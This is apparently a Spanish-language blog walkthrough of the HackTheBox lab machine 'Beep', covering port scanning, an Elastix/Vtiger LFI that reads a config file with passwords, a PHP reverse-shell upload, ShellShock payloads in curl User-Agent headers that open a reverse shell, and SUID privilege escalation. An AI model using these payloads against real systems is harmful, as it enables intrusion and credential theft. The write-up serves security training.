---
title: "HTB - Beep"
date: 2023-01-30
categories:
  - blog
tags:
  - HTB
  - Linux
  - Easy
  - Elastix
  - Vtiger
  - Webmin
  - LFI
  - ShellShock
  - SUID
---

# Introducción

## Resumen

Esta es una máquina Linux de dificultad Fácil.

Tiene varios puertos abiertos, de los cuales explotaré el puerto 443 (*HTTPS*) y el 10000 (Webmin). El puerto 443 es vulnerable a un *LFI* del cual se puede aprovechar para leer un archivo de configuración en concreto, que cuenta con una contraseña que se reutiliza en varias partes (incluyendo *SSH*). El puerto 10000 es vulnerable a un ShellShock Attack que nos proporciona acceso como **root**.

La escalada de privilegios es simple, el usuario con el que ingresamos luego del LFI cuenta con permisos de superusuario en muchos binarios vulnerables.

## Máquina

![beep|600](/assets/htb/beep/beep.png)

# Enumeración

## Escaneo de puertos

Para comenzar, haré el primer escaneo de puertos a través del protocolo *TCP*.

```
root@kali:/# nmap -p- --open -sS --min-rate=2000 -n -Pn -oG tcp_grepable 10.10.10.7
```

```
Host: 10.10.10.7 ()     Status: Up
Host: 10.10.10.7 ()     Ports: 22/open/tcp//ssh///, 25/open/tcp//smtp///, 80/open/tcp//http///, 110/open/tcp//pop3///, 111/open/tcp//rpcbind///, 143/open/tcp//imap///, 443/open/tcp//https///, 878/open/tcp//unknown///, 993/open/tcp//imaps///, 995/open/tcp//pop3s///, 3306/open/tcp//mysql///, 4190/open/tcp//sieve///, 4445/open/tcp//upnotifyp///, 4559/open/tcp//hylafax///, 5038/open/tcp/////, 10000/open/tcp//snet-sensor-mgmt///     Ignored State: closed (65519)
```

A continuación, utilizaré la utilidad `extract_ports` para parsear y copiar los puertos en la clipboard.

```
root@kali:/# extract_ports tcp_grepable 
[+] Open ports have been copied to the clipboard.
```

Esta utilidad es una simple función de `bash` que tengo guardado en el archivo de configuración de mi shell.

```bash
extract_ports() {
    open_ports=$(grep -oP '\d{1,5}/open' $1 | awk -F '/' '{print $1}' | tr '\n' ',' | sed 's/,$//')

    if [ ${#open_ports} -ne 0 ]; then
        echo -n $open_ports | xclip -selection clipboard

        echo "[+] Open ports have been copied to the clipboard."
    else
        echo "[-] No open ports found."
    fi
}
```

Es importante tener instalado en tu sistema `xclip`, ya que esta herramienta es la encargada de copiar los puertos en la clipboard.

Lo siguiente será realizar un escaneo mas minucioso.

```
root@kali:/# nmap -p 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 -sCV -oN tcp_ports 10.10.10.7
```

```
Nmap scan report for 10.10.10.7
Host is up (0.33s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 adee5abb6937fb27afb83072a0f96f53 (DSA)
|_  2048 bcc6735913a18a4b550750f6651d6d0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.10.10.7/
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) UIDL STLS LOGIN-DELAY(0) TOP AUTH-RESP-CODE USER RESP-CODES APOP EXPIRE(NEVER)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: ATOMIC UIDPLUS OK RIGHTS=kxte URLAUTHA0001 X-NETSCAPE NO CATENATE LIST-SUBSCRIBED THREAD=ORDEREDSUBJECT LISTEXT CHILDREN IMAP4rev1 CONDSTORE QUOTA SORT UNSELECT ANNOTATEMORE SORT=MODSEQ THREAD=REFERENCES BINARY MULTIAPPEND Completed LITERAL+ IMAP4 ID STARTTLS ACL MAILBOX-REFERRALS RENAME NAMESPACE IDLE
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
|_ssl-date: 2023-01-30T12:21:38+00:00; +1h00m00s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| http-robots.txt: 1 disallowed entry 
|_/
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: 59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

## Puertos 80-443/TCP

Antes de ver la web en el navegador, listare un poco mas de información con `whatweb`.

```
root@kali:/# whatweb http://10.10.10.7
http://10.10.10.7 [302 Found] Apache[2.2.3], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.2.3 (CentOS)], IP[10.10.10.7], RedirectLocation[https://10.10.10.7/], Title[302 Found]
https://10.10.10.7/ [200 OK] Apache[2.2.3], Cookies[elastixSession], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.2.3 (CentOS)], IP[10.10.10.7], PHP[5.1.6], PasswordField[input_pass], Script[text/javascript], Title[Elastix - Login page], X-Powered-By[PHP/5.1.6]
```

La utilidad me muestra que hay una redirección y el servidor cuenta con un panel de autenticación de Elastix.

Echare un vistazo a esto en el navegador, en mi caso Firefox.

![ssl-error|600](/assets/htb/beep/ssl-error.png)

Por lo que se ve, la web no es compatible con el protocolo *TLS* 1.2, que es la versión mínima de Firefox (por defecto).

Para solucionar este problema hay que habilitar el protocolo *TLS* 1.0.

En el editor de configuración de Firefox (about:config) filtra por *security.tls.version* y establece el valor de *security.tls.version.min* a 1 y el valor de *security.tls.version.max* a 3.

Ahora si, puedo ver el panel de autenticación de Elastix.

![elastix](/assets/htb/beep/elastix.png)

Las credenciales por defecto no funcionan, así que haré una búsqueda de vulnerabilidades con `searchsploit`.

```
root@kali:/# searchsploit elastix
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                                         | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                       | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                 | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                              | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                                             | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                                            | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                        | php/webapps/18650.py
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

En este caso le echaré un vistazo "Local File Inclusion".

```perl
#source: https://www.securityfocus.com/bid/55078/info

#Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.

#An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks.

#Elastix 2.2.0 is vulnerable; other versions may also be affected.

#!/usr/bin/perl -w

#------------------------------------------------------------------------------------#
#Elastix is an Open Source Sofware to establish Unified Communications.
#About this concept, Elastix goal is to incorporate all the communication alternatives,
#available at an enterprise level, into a unique solution.
#------------------------------------------------------------------------------------#
############################################################
# Exploit Title: Elastix 2.2.0 LFI
# Google Dork: :(
# Author: cheki
# Version:Elastix 2.2.0
# Tested on: multiple
# CVE : notyet
# romanc-_-eyes ;)
# Discovered by romanc-_-eyes
# vendor http://www.elastix.org/

print "\t Elastix 2.2.0 LFI Exploit \n";
print "\t code author cheki   \n";
print "\t 0day Elastix 2.2.0  \n";
print "\t email: anonymous17hacker{}gmail.com \n";

#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

use LWP::UserAgent;
print "\n Target: https://ip ";
chomp(my $target=<STDIN>);
$dir="vtigercrm";
$poc="current_language";
$etc="etc";
$jump="../../../../../../../..//";
$test="amportal.conf%00";

$code = LWP::UserAgent->new() or die "inicializacia brauzeris\n";
$code->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "/".$dir."/graph.php?".$poc."=".$jump."".$etc."/".$test."&module=Accounts&action";
$res = $code->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~ 'This file is part of FreePBX') {

print "\n read amportal.conf file : $answer \n\n";
print " successful read\n";

}
else {
print "\n[-] not successful\n";
        }
```

Lo importante del script está en la linea 32.

```
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

Por la ruta del *LFI*, veo que el servicio dispone de CRM Vtiger.

El cual es otro panel de autenticación.

![vtiger|600](/assets/htb/beep/vtiger.png)

> Gracias a Dark Reader aún no estoy ciego...

Lo siguiente, será ver que contiene el archivo de configuración del *LFI*.

```
root@kali:/# # curl -k 'https://10.10.10.7//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action'
```

El archivo es muy grande, por lo que solo mostraré las credenciales del principio.

```
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```

La contraseña **jEhdIekWmdjE** es válida para ambos paneles de autenticación, pero eso lo dejare para más adelante.

## Puerto 10000/TCP

En este puerto comúnmente corre el servicio Webmin.

Como hice con el puerto 80, ejecutaré la utilidad `whatweb`.

```
root@kali:/# whatweb http://10.10.10.7:10000
http://10.10.10.7:10000 [200 OK] Country[RESERVED][ZZ], HTTPServer[MiniServ/1.570], IP[10.10.10.7]
```

No me muestra nada interesante así que le echare un vistazo en el navegador.

![bad-request](/assets/htb/beep/bad-request.png)

Solo me aparece un aviso de que el servidor esta corriendo por *HTTPS*.

Probé las credenciales **admin**:**jEhdIekWmdjE** pero no son válidas.

![session-login](/assets/htb/beep/session-login.png)

La *URL* me llama la atención, ya que muchos scripts *CGI* utilizan el intérprete de comandos Bash para procesar datos enviados a través de formularios web o solicitudes de red y estos son especialmente vulnerables a los ataques de ShellShock.

Ya lo probaré más tarde.

# Explotación

## Puerto 22/TCP

Aunque esto es solamente una reutilización de credenciales, lo pongo en el apartado de Explotación para que quede mas ordenado...

La contraseña **jEhdIekWmdjE** es válida para conectarme como el usuario **root** por *SSH*.

```
root@kali:/# ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
root@10.10.10.7's password: 
Last login: Mon Jan 30 16:25:40 2023 from 10.10.16.3

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# whoami
root
[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[root@beep ~]# 
```

## Puerto 443/TCP

Las credenciales **admin**:**jEhdIekWmdjE** son válidas para el panel de autenticación de Elastix.

![elastix-index](/assets/htb/beep/elastix-index.png)

Y también para el panel de autenticación de Vtiger.

![vtiger-index](/assets/htb/beep/vtiger-index.png)

En este caso estaré explotando el CRM Vtiger.

En *SETTINGS* -> *Settings* -> *Company Details* se puede cambiar el logo de la compañía.

La web dice que solo te permite subir imágenes con extensión .jpg, por lo que intentaré subir una archivo con extensión .php.jpg que me entable una reverse shell a mi máquina local.

```php
<?php
    system('bash -i >& /dev/tcp/10.10.16.3/443 0>&1')
?>
```

En primer lugar, me pondré en escucha con *nc*.

```
root@kali:/# nc -vnlp 443
listening on [any] 443 ...
```

Después de subir el archivo, la máquina me envió una conexión.

```
root@kali:/# nc -vnlp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 51160
bash: no job control in this shell
bash-3.2$ whoami
asterisk
bash-3.2$ id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
bash-3.2$ 
```

Soy el usuario **asterisk**.

Ahora toca hacer un tratamiento de la *TTY*.

```
root@kali:/# nc -vnlp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 51160
bash: no job control in this shell
bash-3.2$ whoami
asterisk
bash-3.2$ id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
bash-3.2$ script /dev/null -c bash
bash-3.2$ ^Z
zsh: suspended  nc -vnlp 443
                                                                                                                                                                                
┌──(root㉿kali)-[/home/…/Documents/htb/beep/tmp]
└─# stty raw -echo; fg
[1]  + continued  nc -vnlp 443

Erase set to delete.
Kill set to control-U (^U).
Interrupt set to control-C (^C).
bash-3.2$ 
```

* `script /dev/null -c bash`: Este comando ejecuta una sesión de intérprete de comandos Bash.
* CTRL+Z: Esta combinación de teclas detiene temporalmente el proceso y lo pasa a segundo plano.
* `stty raw -echo; fg`: Esta combinación de comandos configura el terminal en modo raw, sin eco, y reanuda el proceso detenido en primer plano.
* "reset xterm": Después de ejecutar el comando anterior hay que ingresar esta cadena (tal vez al escribirla no se vea, pero estará ahí) para restablecer la terminal.

Por último, hay que exportar dos variables de entorno y ajustar las filas y las columnas de la terminal.

Con `stty size` puedes ver dichas proporciones.

```
bash-3.2$ export TERM=xterm
bash-3.2$ export SHELL=bash
bash-3.2$ stty rows 48 columns 175
bash-3.2$ 
```

Ahora tengo acceso con una terminal completamente interactiva.

## Puerto 10000/TCP

Para comprobar que se estén ejecutando los comandos en la máquina victima, me enviaré una traza *ICMP* a mi máquina local.

Primero, me pondré en escucha con `tcpdump`.

```
root@kali:/# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Luego, con `curl` intentaré explotar el ShellShock.

```
root@kali:/# curl https://10.10.10.7:10000/session_login.cgi -k -H 'User-Agent: () { :; }; ping -c 1 10.10.16.3'
```

Funcionó, recibo una traza *ICMP*.

```
root@kali:/# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:55:28.357873 IP 10.10.10.7 > 10.10.16.3: ICMP echo request, id 19738, seq 1, length 64
12:55:28.357883 IP 10.10.16.3 > 10.10.10.7: ICMP echo reply, id 19738, seq 1, length 64
```

Ahora, para aprovechar que puedo ejecutar comandos en la máquina victima, entablaré una reverse shell.

El proceso es el mismo que antes. Primero me pongo en escucha con `nc`.

```
root@kali:/# nc -vnlp 443
listening on [any] 443 ...
```

Luego con `curl` ejecuto el comando.

```
root@kali:/# curl https://10.10.10.7:10000/session_login.cgi -k -H 'User-Agent: () { :; }; bash -i >& /dev/tcp/10.10.16.3/443 0>&1'
```

Y la máquina víctima me envía una conexión.

```
root@kali:/# nc -vnlp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 38816
bash: no job control in this shell
[root@beep webmin]# whoami
root
[root@beep webmin]# id 
uid=0(root) gid=0(root)
[root@beep webmin]# 
```

En este caso, soy el usuario **root** directamente.

# Escalada de privilegios

## De asterisk a root

Después de explotar el ShellShock a través del puerto 443, toca escalar privilegios.

Al ejecutar el comando `sudo -l` veo que este usuario puede ejecutar como el usuario **root** distintos binarios vulnerables.

```
bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
bash-3.2$ 
```

Con [GTFOBins](https://gtfobins.github.io/) puedes ver distintas formas de aprovecharte de los binarios y sus permisos.

El que utilizaré en este caso es `chmod`. Asignaré el permiso *SUID* al binario de la `bash` y luego lo ejecutaré con la opción `-p`.

```
bash-3.2$ sudo chmod u+s /bin/bash
bash-3.2$ bash -p
bash-3.2# whoami
root
bash-3.2# id
uid=100(asterisk) gid=101(asterisk) euid=0(root) groups=101(asterisk)
bash-3.2# 
```

Con esto concluye la resolución de la máquina.

# Flags

La flag del usuario está en el directorio personal del usuario **fanis**.

La flag de root esta en su directorio personal.